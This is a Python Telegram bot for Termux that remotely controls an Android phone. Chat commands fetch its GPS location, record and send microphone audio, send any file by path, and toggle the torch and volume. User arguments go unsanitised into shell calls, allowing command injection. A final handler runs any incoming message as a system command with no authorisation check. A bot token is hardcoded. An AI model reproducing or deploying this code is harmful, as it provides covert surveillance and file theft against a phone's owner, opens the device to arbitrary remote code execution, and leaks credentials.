# mengimport package pyTelegramBotAPI
import telebot, json
import subprocess, os

# inisialisasi Token Bot
bot = telebot.TeleBot('6685750122:AAE3rPQEupZjWTE6o3QaeF1YEOUYMfcoMLo')
default_chat_id = 5981475588

users = [5981475588]

def verify_user(chat_id):
	for user in users:
		if chat_id == user:
			print(user)
			return False

	return True

def extract_arg(arg):
    return arg.split(' ', 1)[1]

def lokasi():
	print('starting termux-location...')
	result = subprocess.run(['termux-location'], stdout=subprocess.PIPE).stdout
	print('get JSON')
	result_json = json.loads(result)
	print('get latitude and longitude information')
	latitude = result_json['latitude']
	longitude = result_json['longitude']
	print(f'latitude: {latitude} longitude: {longitude}')
	return latitude, longitude

# Menghandle Pesan /start
@bot.message_handler(commands=['start'])
def welcome(message):
	# membalas pesan
	bot.reply_to(message, 'Halo, apa kabar?')

# Menghandle Pesan /start
@bot.message_handler(commands=['id'])
def get_chat_id(message):
	# membalas pesan
	bot.reply_to(message, f'Your chat id: {message.chat.id}')

# Menghandle Pesan /lokasi
@bot.message_handler(commands=['location', 'lokasi'])
def kirim_lokasi(message):
	# membalas pesan
	if verify_user(message.chat.id):
		print('failed: chat id not valid')
		return

	#bot.reply_to(message, message.chat.id)
	bot.reply_to(message, 'Mendapatkan lokasi...')

	latitude, longitude = lokasi()

	bot.send_location(message.chat.id, latitude, longitude)

	#http://www.google.com/maps/place/

# Menghandle Pesan /rickroll
@bot.message_handler(commands=['record'])
def record(message):
	# membalas pesan
	if verify_user(message.chat.id):
		print('failed: chat id not valid')
		return

	print('send audio...')

	arg = extract_arg(message.text)

	print('debug arg: ' + arg)

	if arg == 'start':
		bot.reply_to(message, 'Recording audio...')
		os.system(f'termux-microphone-record -f record.mp3')
	elif arg == 'stop':
		bot.reply_to(message, 'Recording stop...')
		os.system(f'termux-microphone-record -q')
	elif arg == 'send':
		bot.reply_to(message, 'Send audio...')
		bot.send_audio(chat_id=message.chat.id, audio=open('record.mp3', 'rb'))
	else:
		return

# Menghandle Pesan /rickroll
@bot.message_handler(commands=['getfile'])
def get_file(message):
	# membalas pesan
	if verify_user(message.chat.id):
		print('failed: chat id not valid')
		return

	print('send file...')

	arg = extract_arg(message.text)

	print('debug arg: ' + arg)

	bot.send_document(chat_id=message.chat.id, document=open(arg, 'rb'))

# Menghandle Pesan /battery
@bot.message_handler(commands=['battery', 'baterai'])
def battery(message):
	# membalas pesan
	if verify_user(message.chat.id):
		print('failed: chat id not valid')
		return

	bot.reply_to(message, 'Mendapatkan informasi baterai...')
	result = subprocess.run(['termux-battery-status'], stdout=subprocess.PIPE).stdout
	print('get JSON')
	result_json = json.loads(result)
	bot.reply_to(message, f'Informasi Baterai\npersentase: {result_json["percentage"]}%\nstatus: {result_json["status"]}\nsuhu: {result_json["temperature"]}')

# Menghandle Pesan /torch
@bot.message_handler(commands=['torch', 'senter'])
def torch(message):
	# membalas pesan
	if verify_user(message.chat.id):
		print('failed: chat id not valid')
		return

	arg = extract_arg(message.text)

	os.system(f'termux-torch {arg}')

	bot.reply_to(message, 'Berhasil menyalakan/mematikan senter')

# Menghandle Pesan /vibrate
@bot.message_handler(commands=['vibrate', 'getar'])
def vibrate(message):
	# membalas pesan
	if verify_user(message.chat.id):
		print('failed: chat id not valid')
		return

	os.system('termux-vibrate')

	bot.reply_to(message, 'Berhasil menggetarkan ponsel')

# Menghandle Pesan /volume
@bot.message_handler(commands=['volume'])
def volume(message):
	# membalas pesan
	if verify_user(message.chat.id):
		print('failed: chat id not valid')
		return

	arg = extract_arg(message.text)

	os.system(f'termux-volume music {arg}')

	bot.reply_to(message, f'Berhasil mengubah volume menjadi {arg}')

# Menghandle Pesan /userlist
@bot.message_handler(commands=['userlist'])
def userlist(message):
	# membalas pesan
	if verify_user(message.chat.id):
		print('failed: chat id not valid')
		return

	print(users)

	bot.reply_to(message, f'User List\n{users}')

# Menghandle Pesan /adduser
@bot.message_handler(commands=['adduser'])
def adduser(message):
	# membalas pesan
	if verify_user(message.chat.id):
		print('failed: chat id not valid')
		return

	arg = extract_arg(message.text)

	users.append(int(arg))

	print(users)

	bot.reply_to(message, f'Berhasil menambahkan pengguna {int(arg)}')

# Menghandle Pesan /userdel
@bot.message_handler(commands=['userdel'])
def userdel(message):
	# membalas pesan
	if verify_user(message.chat.id):
		print('failed: chat id not valid')
		return

	arg = extract_arg(message.text)

	users.remove(int(arg))

	print(users)

	bot.reply_to(message, f'Berhasil menghapus pengguna {int(arg)}')

# Menghandle Pesan /message
@bot.message_handler(commands=['message'])
def send_msg(message):
	# membalas pesan
	if verify_user(message.chat.id):
		print('failed: chat id not valid')
		return

	arg = extract_arg(message.text)

	bot.reply_to(message, f'Mengirim pesan "{arg}"')
	bot.reply_to(message, 'Menunggu jawaban...')
	result = subprocess.run([f'termux-dialog -t "{arg}"'], stdout=subprocess.PIPE).stdout
	print('get JSON')
	result_json = json.loads(result)
	bot.reply_to(message, result_json['text'])

# Menghandle Pesan /info
@bot.message_handler(commands=['info'])
def info(message):
	# membalas pesan
	if verify_user(message.chat.id):
		print('failed: chat id not valid')
		return

	bot.reply_to(message, 'Informasi Perangkat\nTipe perangkat: Ponsel\nNama perangkat: MI A1')

# Menghandle Pesan /rickroll
@bot.message_handler(commands=['rickroll'])
def rickroll(message):
	# membalas pesan
	if verify_user(message.chat.id):
		print('failed: chat id not valid')
		return

	bot.reply_to(message, 'https://www.youtube.com/watch?v=dQw4w9WgXcQ')

'''
# Menghandle Pesan /exit
@bot.message_handler(commands=['help', 'bantuan'])
def help(message):
	# membalas pesan
	if verify_user(message.chat.id):
		print('failed: chat id not valid')
		return

	bot.reply_to(message, 'Command list\nlocation/lokasi - Mendapatkan lokasi\n')
'''

# Menghandle Pesan /exit
@bot.message_handler(commands=['exit', 'keluar'])
def bot_exit(message):
	# membalas pesan
	if verify_user(message.chat.id):
		print('failed: chat id not valid')
		return

	bot.reply_to(message, 'exit...')
	os.system('killall python3')

@bot.message_handler(func=lambda msg: True)
def echo_all(message):
	result = subprocess.run([message.text], stdout=subprocess.PIPE).stdout
	bot.reply_to(message, result)

while True:
	try:
		bot.polling()
	except:
		pass
